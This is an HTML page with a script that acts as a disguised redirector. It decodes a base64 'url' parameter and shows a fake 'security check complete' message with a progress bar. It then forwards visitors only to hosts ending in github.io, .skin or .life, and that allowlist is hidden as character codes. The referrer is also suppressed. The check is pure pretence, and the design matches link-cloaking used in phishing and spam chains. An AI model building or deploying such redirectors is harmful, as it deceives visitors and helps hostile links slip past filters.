<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="referrer" content="no-referrer">
  <title></title>
  <style>
    #load {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(255, 255, 255, 0.95);
      display: flex; justify-content: center; align-items: center;
      z-index: 9999; flex-direction: column; text-align: center;
      font-family: sans-serif;
    }
    .kz { display: flex; gap: 12px; margin-bottom: 16px; }
    .pz { width: 16px; height: 16px; border-radius: 50%; animation: xb 0.6s infinite alternate; }
    .pz:nth-child(1){ background:#e91e63; animation-delay:0s;}
    .pz:nth-child(2){ background:#2196f3; animation-delay:.2s;}
    .pz:nth-child(3){ background:#f9d402; animation-delay:.4s;}
    @keyframes xb {from{transform:translateY(0);opacity:.6;} to{transform:translateY(-15px);opacity:1;}}

    .progress-container {
      width: 220px;
      height: 6px;
      background: #eee;
      border-radius: 3px;
      overflow: hidden;
      margin-top: 10px;
    }
    .progress-bar {
      width: 0%;
      height: 100%;
      background: linear-gradient(90deg, #2196f3, #4caf50);
      border-radius: 3px;
      transition: width 0.2s ease;
    }

    #prompt { display:none; font-size:16px; color:#333; margin-top:10px; }
  </style>
</head>
<body>
  <div id="load">
    <div class="kz">
      <div class="pz"></div>
      <div class="pz"></div>
      <div class="pz"></div>
    </div>
    <div class="progress-container"><div class="progress-bar" id="bar"></div></div>
    <div id="prompt">üîé Ë´ãÁ®çÂÄô...</div>
  </div>

  <script>
    (function(){
      function g(p){return new URLSearchParams(window.location.search).get(p);}
      function c(u){
        try{
          var h=(new URL(u)).hostname.toLowerCase();
          var s1=String.fromCharCode(103,105,116,104,117,98,46,105,111); 
          var s2=String.fromCharCode(46,115,107,105,110);               
          var s3=String.fromCharCode(46,108,105,102,101);               
          return h.endsWith(s1) || h.endsWith(s2) || h.endsWith(s3);
        }catch(e){return false;}
      }

      var r=g('url'),
          prompt=document.getElementById('prompt'),
          bar=document.getElementById('bar'),
          progress=0;

      if(r){
        try{
          var t=atob(r);
          prompt.style.display='block';
          var totalTime = 2500 + Math.random() * 2500; 
          var start = performance.now();

          function animate(now){
            var elapsed = now - start;
            progress = Math.min((elapsed / totalTime) * 100, 100);
            bar.style.width = progress + "%";
            if(progress < 100){
              requestAnimationFrame(animate);
            }
          }
          requestAnimationFrame(animate);

          if(c(t)){
            setTimeout(function(){
              bar.style.width = "100%";
              prompt.innerHTML='‚úÖ ÂÆâÂÖ®Ê™¢Ê∏¨ÂÆåÊàêÔºåÊ≠£Âú®Ë∑≥ËΩâ...';
              setTimeout(()=>window.location.href=t, 500 + Math.random()*1000);
            }, totalTime);
          }else{
           
          }
        }catch(e){
      
        }
      }else{
       
      }
    })();
  </script>
</body>
</html>
